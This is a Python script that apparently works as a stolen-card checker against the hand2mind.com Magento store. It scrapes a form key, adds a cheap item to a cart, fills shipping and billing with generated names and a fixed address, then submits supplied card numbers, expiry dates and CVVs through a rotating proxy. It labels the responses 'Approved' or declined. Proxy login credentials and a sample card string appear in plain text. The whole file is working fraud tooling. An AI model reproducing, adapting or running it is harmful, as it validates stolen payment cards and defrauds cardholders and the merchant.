from bs4 import BeautifulSoup
import random
import aiohttp
import asyncio
import names
import platform
import ssl
import certifi
import names
import random_address

genaddr = random_address.real_random_address()
address = genaddr['address1']
try: 
    City = genaddr['city']
except KeyError:
    City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']
first = names.get_first_name()
last = names.get_last_name()
if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(10000,999999)}@gmail.com"

async def ChaseMagento(cc, proxyrand):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        timeout=18
        splitter = cc.split('|')
        ccnum    = splitter[0]
        mes      = splitter[1]
        ano      = splitter[2]
        cvv      = splitter[3] 
        try:
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                # 'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Referer': 'https://www.hand2mind.com/products?product_list_order=price',
                # 'Cookie': '_ga_0FXB7EWFN3=GS1.1.1677191944.1.1.1677191958.0.0.0; _ce.s=gtrk.la~lehos6xk~v~536d9c3f7036789ab119837718880cff8ec572c6~vpv~0~v11.rlc~1677191946434~ir~1; msd365mkttr=pkKrYaao3tugHiuc6MeT054rZbWa-OuAhbUj3BFo; msd365mkttrs=PDqX6PfG; _vwo_uuid_v2=D508F9B364663B040364B118B3D5D89D4|bfda9699e3f07374053f1ec1a486d68c; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vwo_uuid=D508F9B364663B040364B118B3D5D89D4; _vwo_ds=3%241677191933%3A71.53461322%3A%3A; _vwo_sn=0%3A3; _vis_opt_exp_16_combi=2; form_key=akVrpYGWxcZl6mlD; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; _gcl_au=1.1.1863827240.1677191944; _ga=GA1.2.265989772.1677191945; _pin_unauth=dWlkPVl6WTNOMk5oTVRrdE4yVmxZUzAwTkRWbUxUbGtZMlF0TTJGalptRmtOR1l6WVRGbQ; _gid=GA1.2.606691815.1677191945; _dc_gtm_UA-87522-1=1; cebs=1; _hjSessionUser_1423770=eyJpZCI6Ijc5NDBhNmYyLTg5YjUtNTcyYS04NjNkLWVmNWVkNTM3ZDE4OCIsImNyZWF0ZWQiOjE2NzcxOTE5NDU3NTQsImV4aXN0aW5nIjp0cnVlfQ==; _hjFirstSeen=1; _hjIncludedInSessionSample_1423770=0; _hjSession_1423770=eyJpZCI6IjM0ZGM2Yzk2LTJmOGMtNDEyZC1iMmRlLTI5Zjg4MDk2OTRhOSIsImNyZWF0ZWQiOjE2NzcxOTE5NDU3NTYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1677191946027.45PrWcWBvSAXGj8bD2EAcwLJEf6Bkfw9Y1EknVsZCggqiNixWMwTX9HNJQ24FVfuLa4t8eXt1HPA1iUitADJLCoS5ua3WQR; _uetsid=e0a0f140b3ca11edb896ffecbca11ae8; _uetvid=e0a109c0b3ca11ed94a8af2b3fb49ae0',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                # Requests doesn't support trailers
                # 'TE': 'trailers',
            })
            async with session.get('https://www.hand2mind.com/item/12-learning-resources-ultraflex-safe-t-ruler', proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/"), timeout=22) as resp:
                try :          
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                    form_key = soup.find("input", {"name": "form_key"})["value"]
                except (UnboundLocalError) :
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
                except (TypeError) :
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
                except (KeyError) :
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 2------------------------------#
            #---------------------------------REQUEST NUMERO 2------------------------------#         
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                # 'Accept-Encoding': 'gzip, deflate, br',
                'X-Requested-With': 'XMLHttpRequest',
                #'Content-Type': 'multipart/form-data; boundary=---------------------------42480077803567445037540997053',
                'Origin': 'https://www.hand2mind.com',
                'Connection': 'keep-alive',
                'Referer': 'https://www.hand2mind.com/item/12-learning-resources-ultraflex-safe-t-ruler',
                'Cookie': f'_ga_0FXB7EWFN3=GS1.1.1677191944.1.1.1677191977.0.0.0; _ce.s=gtrk.la~lehos6xk~v~536d9c3f7036789ab119837718880cff8ec572c6~vpv~0~v11.rlc~1677191946434~ir~1; msd365mkttr=pkKrYaao3tugHiuc6MeT054rZbWa-OuAhbUj3BFo; msd365mkttrs=PDqX6PfG; _vwo_uuid_v2=D508F9B364663B040364B118B3D5D89D4|bfda9699e3f07374053f1ec1a486d68c; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vwo_uuid=D508F9B364663B040364B118B3D5D89D4; _vwo_ds=3%241677191933%3A71.53461322%3A%3A; _vwo_sn=0%3A4; _vis_opt_exp_16_combi=2; form_key={form_key}; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; _gcl_au=1.1.1863827240.1677191944; _ga=GA1.2.265989772.1677191945; _pin_unauth=dWlkPVl6WTNOMk5oTVRrdE4yVmxZUzAwTkRWbUxUbGtZMlF0TTJGalptRmtOR1l6WVRGbQ; _gid=GA1.2.606691815.1677191945; _dc_gtm_UA-87522-1=1; cebs=1; _hjSessionUser_1423770=eyJpZCI6Ijc5NDBhNmYyLTg5YjUtNTcyYS04NjNkLWVmNWVkNTM3ZDE4OCIsImNyZWF0ZWQiOjE2NzcxOTE5NDU3NTQsImV4aXN0aW5nIjp0cnVlfQ==; _hjFirstSeen=1; _hjIncludedInSessionSample_1423770=0; _hjSession_1423770=eyJpZCI6IjM0ZGM2Yzk2LTJmOGMtNDEyZC1iMmRlLTI5Zjg4MDk2OTRhOSIsImNyZWF0ZWQiOjE2NzcxOTE5NDU3NTYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1677191946027.45PrWcWBvSAXGj8bD2EAcwLJEf6Bkfw9Y1EknVsZCggqiNixWMwTX9HNJQ24FVfuLa4t8eXt1HPA1iUitADJLCoS5ua3WQR; _uetsid=e0a0f140b3ca11edb896ffecbca11ae8; _uetvid=e0a109c0b3ca11ed94a8af2b3fb49ae0',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                # Requests doesn't support trailers
                # 'TE': 'trailers',
            }
            data = {
                'product': '14673',
                'selected_configurable_option': '',
                'related_product': '',
                'item': '14673',
                'form_key': form_key,
                'qty': '1',
            }
            async with session.post(f'https://www.hand2mind.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuaGFuZDJtaW5kLmNvbS9pdGVtLzEyLWxlYXJuaW5nLXJlc291cmNlcy11bHRyYWZsZXgtc2FmZS10LXJ1bGVy/product/14673/', headers=headers,data=data, proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/"), timeout=30) as resp:
                try :          
                    response = await resp.text()
                except (UnboundLocalError) :
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
                except (TypeError) :
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
                except (KeyError) :
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 4-------------------------------#
            #---------------------------------REQUEST NUMERO 4-------------------------------#
            async with session.get('https://www.hand2mind.com/checkout/', proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/"), timeout=timeout) as resp:
                try :          
                    responsev1 = await resp.text()
                    lines = responsev1.split('"quoteData":{"entity_id":"')[1]
                    entity_id = lines.split('","')[0]
                except (UnboundLocalError) :
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                except (TypeError) :
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                except (KeyError) :
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                'Accept': '*/*',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                # 'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://www.hand2mind.com',
                'Connection': 'keep-alive',
                'Referer': 'https://www.hand2mind.com/checkout/',
                # 'Cookie': '_ga_0FXB7EWFN3=GS1.1.1677191944.1.1.1677193016.0.0.0; _ce.s=gtrk.la~lehos6xk~v~536d9c3f7036789ab119837718880cff8ec572c6~vpv~0~v11.rlc~1677191946434~ir~1; msd365mkttr=pkKrYaao3tugHiuc6MeT054rZbWa-OuAhbUj3BFo; msd365mkttrs=PDqX6PfG; _vwo_uuid_v2=D508F9B364663B040364B118B3D5D89D4|bfda9699e3f07374053f1ec1a486d68c; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vwo_uuid=D508F9B364663B040364B118B3D5D89D4; _vwo_ds=3%241677191933%3A71.53461322%3A%3A; _vis_opt_exp_16_combi=2; form_key=akVrpYGWxcZl6mlD; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; _gcl_au=1.1.1863827240.1677191944; _ga=GA1.2.265989772.1677191945; _pin_unauth=dWlkPVl6WTNOMk5oTVRrdE4yVmxZUzAwTkRWbUxUbGtZMlF0TTJGalptRmtOR1l6WVRGbQ; _gid=GA1.2.606691815.1677191945; cebs=1; _hjSessionUser_1423770=eyJpZCI6Ijc5NDBhNmYyLTg5YjUtNTcyYS04NjNkLWVmNWVkNTM3ZDE4OCIsImNyZWF0ZWQiOjE2NzcxOTE5NDU3NTQsImV4aXN0aW5nIjp0cnVlfQ==; _hjFirstSeen=1; _hjIncludedInSessionSample_1423770=0; _hjSession_1423770=eyJpZCI6IjM0ZGM2Yzk2LTJmOGMtNDEyZC1iMmRlLTI5Zjg4MDk2OTRhOSIsImNyZWF0ZWQiOjE2NzcxOTE5NDU3NTYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1677191946027.426382565; _ce.clock_event=1; _ce.clock_data=-1255%2C179.6.215.181; cebsp_=5; PHPSESSID=ff33cb09787c54c7085b9cb96b4c8ee1; private_content_version=304b28b7e321101fa20663465e1471ff; form_key=akVrpYGWxcZl6mlD; dataservices_cart_id=%22627643%22; dataservices_product_context=%7B%22productId%22%3A14673%2C%22name%22%3A%2212%5C%22%20Learning%20Resources%20UltraFlex%5Cu00ae%20SAFE-T%5Cu00ae%20Ruler%22%2C%22sku%22%3A%2287286%22%2C%22topLevelSku%22%3A%2287286%22%2C%22specialFromDate%22%3Anull%2C%22specialToDate%22%3Anull%2C%22newFromDate%22%3Anull%2C%22newToDate%22%3Anull%2C%22createdAt%22%3A%222020-11-30%2017%3A08%3A03%22%2C%22updatedAt%22%3A%222022-04-28%2016%3A34%3A18%22%2C%22categories%22%3A%5B%2233%22%2C%22225%22%2C%22213%22%2C%223%22%2C%22231%22%2C%22234%22%2C%22237%22%2C%221947%22%2C%222504%22%2C%222507%22%5D%2C%22productType%22%3A%22simple%22%2C%22pricing%22%3A%7B%22regularPrice%22%3A1.99%2C%22minimalPrice%22%3Anull%2C%22specialPrice%22%3Anull%7D%2C%22canonicalUrl%22%3A%22https%3A%5C%2F%5C%2Fwww.hand2mind.com%5C%2Fitem%5C%2F12-learning-resources-ultraflex-safe-t-ruler%3F___store%3Ddefault%22%2C%22mainImageUrl%22%3A%22https%3A%5C%2F%5C%2Fwww.hand2mind.com%5C%2Fmedia%5C%2Fcatalog%5C%2Fproduct%5C%2F1%5C%2F9%5C%2F195b1eac69276a9ae8298c746bafa9832d062b43.jpg%22%7D; authentication_flag=false; mage-cache-sessid=true; _vwo_sn=737%3A2; _uetsid=e0a0f140b3ca11edb896ffecbca11ae8; _uetvid=e0a109c0b3ca11ed94a8af2b3fb49ae0; section_data_ids=%7B%7D',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                # Requests doesn't support trailers
                # 'TE': 'trailers',
            }    
            json_data = {
                'addressInformation': {
                    'shipping_address': {
                        'countryId': 'US',
                        'regionId': '3',
                        'region': '',
                        'street': [
                            '4360 Hagan Road',
                        ],
                        'company': '',
                        'telephone': '7876764543',
                        'postcode': '36109',
                        'city': 'Montgomery',
                        'firstname': first,
                        'lastname': last,
                    },
                    'billing_address': {
                        'countryId': 'US',
                        'regionId': '3',
                        'region': '',
                        'street': [
                            '4360 Hagan Road',
                        ],
                        'company': '',
                        'telephone': '7876764543',
                        'postcode': '36109',
                        'city': 'Montgomery',
                        'firstname': 'Juana',
                        'lastname': 'Izazaa',
                        'saveInAddressBook': None,
                        'extension_attributes': {},
                    },
                    'shipping_method_code': 'amstrates9',
                    'shipping_carrier_code': 'amstrates',
                    'extension_attributes': {},
                },
            }
            
            async with session.post(f'https://www.hand2mind.com/rest/default/V1/guest-carts/{entity_id}/shipping-information', headers=headers, proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/"), json=json_data, timeout=timeout) as resp:
                try :
                    response = await resp.text()
                except (UnboundLocalError) :
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
                except (TypeError) :
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
                except (KeyError) :
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                'Accept': '*/*',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                # 'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://www.hand2mind.com',
                'Connection': 'keep-alive',
                'Referer': 'https://www.hand2mind.com/checkout/',
                # 'Cookie': '_ga_0FXB7EWFN3=GS1.1.1677191944.1.1.1677193016.0.0.0; _ce.s=gtrk.la~lehos6xk~v~536d9c3f7036789ab119837718880cff8ec572c6~vpv~0~v11.rlc~1677191946434~ir~1; msd365mkttr=pkKrYaao3tugHiuc6MeT054rZbWa-OuAhbUj3BFo; msd365mkttrs=PDqX6PfG; _vwo_uuid_v2=D508F9B364663B040364B118B3D5D89D4|bfda9699e3f07374053f1ec1a486d68c; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vwo_uuid=D508F9B364663B040364B118B3D5D89D4; _vwo_ds=3%241677191933%3A71.53461322%3A%3A; _vis_opt_exp_16_combi=2; form_key=akVrpYGWxcZl6mlD; mage-messages=; _gcl_au=1.1.1863827240.1677191944; _ga=GA1.2.265989772.1677191945; _pin_unauth=dWlkPVl6WTNOMk5oTVRrdE4yVmxZUzAwTkRWbUxUbGtZMlF0TTJGalptRmtOR1l6WVRGbQ; _gid=GA1.2.606691815.1677191945; cebs=1; _hjSessionUser_1423770=eyJpZCI6Ijc5NDBhNmYyLTg5YjUtNTcyYS04NjNkLWVmNWVkNTM3ZDE4OCIsImNyZWF0ZWQiOjE2NzcxOTE5NDU3NTQsImV4aXN0aW5nIjp0cnVlfQ==; _hjFirstSeen=1; _hjIncludedInSessionSample_1423770=0; _hjSession_1423770=eyJpZCI6IjM0ZGM2Yzk2LTJmOGMtNDEyZC1iMmRlLTI5Zjg4MDk2OTRhOSIsImNyZWF0ZWQiOjE2NzcxOTE5NDU3NTYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1677191946027.426382565; _ce.clock_event=1; _ce.clock_data=-1255%2C179.6.215.181; cebsp_=5; PHPSESSID=ff33cb09787c54c7085b9cb96b4c8ee1; private_content_version=51e5e520a5ef02502912be760ef51633; form_key=akVrpYGWxcZl6mlD; dataservices_cart_id=%22627643%22; _vwo_sn=737%3A3; _uetsid=e0a0f140b3ca11edb896ffecbca11ae8; _uetvid=e0a109c0b3ca11ed94a8af2b3fb49ae0; _vis_opt_exp_15_combi=2; _vis_opt_exp_13_combi=2; section_data_ids=%7B%22messages%22%3Anull%2C%22company%22%3Anull%7D',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                # Requests doesn't support trailers
                # 'TE': 'trailers',
            }    
            json_data = {
                'cartId': entity_id,
                'billingAddress': {
                    'countryId': 'US',
                    'regionId': '3',
                    'region': 'Alabama',
                    'street': [
                        '4360 HAGAN RD',
                    ],
                    'company': '',
                    'telephone': '7876764543',
                    'postcode': '36109-3135',
                    'city': 'MONTGOMERY',
                    'firstname': first,
                    'lastname': last,
                    'country_id': 'US',
                    'region_code': 'AL',
                    'region_id': 3,
                    'saveInAddressBook': None,
                },
                'paymentMethod': {
                    'method': 'pk_payfabric_option',
                    'additional_data': {
                        'cc_type': 'VI',
                        'cc_number': ccnum,
                        'expiration': mes,
                        'expiration_yr': ano,
                        'cc_cid': cvv,
                        'save_card': False,
                        'captcha_string': None,
                    },
                    'extension_attributes': {},
                },
                'email': CorreoRand,
            }
            
            async with session.post(f'https://www.hand2mind.com/rest/default/V1/guest-carts/{entity_id}/payment-information', headers=headers, proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/"), json=json_data, timeout=timeout) as resp:
                try :
                    response = await resp.text()
                except (UnboundLocalError) :
                    await session.close()
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'
                except (TypeError) :
                    await session.close()
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'
                except (KeyError) :
                    await session.close()
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️' 

            if int(response.find('Credit Floor')) > 0 :
                await session.close()
                return "Approved", "Credit Floor"
            elif int(response.find('CVC2 Failure')) > 0 :
                await session.close()
                return "Approved", "CVV2/CVC2 Failure" 
            elif len(response) == 8 :
                await session.close()
                return "Approved", "Charged 8$"
            elif int(response.find('There is an error in payment processing')) > 0 :
                respjson = await resp.json()
                respjson = respjson['message']
                Message = str(respjson).replace(f'There is an error in payment processing. Error: There is an error in payment processing. Error: ',"")
                await session.close()
                return Message
            else :
                await session.close()
                return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (asyncio.exceptions.TimeoutError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (aiohttp.client_exceptions.ClientConnectorError):
            return "An unexpected error occurred. Timeout Error. ♻️"

#print(asyncio.run(RyukCHK("4117168081144781|03|2023|385", "http://fctmbbxo-rotate:x4zj0j8n7k82@p.webshare.io:80/")))
